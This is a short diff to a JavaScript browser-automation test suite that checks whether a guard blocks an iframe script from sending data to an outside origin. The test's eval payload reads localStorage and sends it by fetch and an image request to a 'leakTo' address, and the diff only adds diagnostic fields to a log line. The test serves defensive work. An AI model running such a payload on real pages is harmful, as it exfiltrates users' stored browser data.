@@ -309,7 +309,7 @@ async function main() {
         let leak = /** @type {any} */ (null);
         for (let n = 0; n < 8; n++) {
           leak = await step("an eval inside the iframe sends localStorage to a fresh origin" + (n ? ` (again ${n})` : ""), () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: `(async () => { localStorage.setItem('k', 'v'); try { await fetch(${JSON.stringify(leakTo)} + encodeURIComponent(JSON.stringify(localStorage))); } catch (e) {} new Image().src = ${JSON.stringify(leakTo)} + 'img'; return 1; })()` }));
-          console.log("[frames-suite] EGRESS " + JSON.stringify({ n, held: leak.held, contained: leak.contained, why: String(leak.why || "").slice(0, 160) }));
+          console.log("[frames-suite] EGRESS " + JSON.stringify({ n, held: leak.held, contained: leak.contained, why: String(leak.why || "").slice(0, 160), ...(leak.diag ? { paused: leak.diag.paused, probe: leak.diag.probe } : {}) }));
           need(leak.held === true, "eval.frame.guard", `a script inside the iframe that sent storage to a fresh origin was not held (run ${n}): ${short(leak)} (the guard covers the top page only)`);
           await sleep(300);
           const got = (await state()).collected;
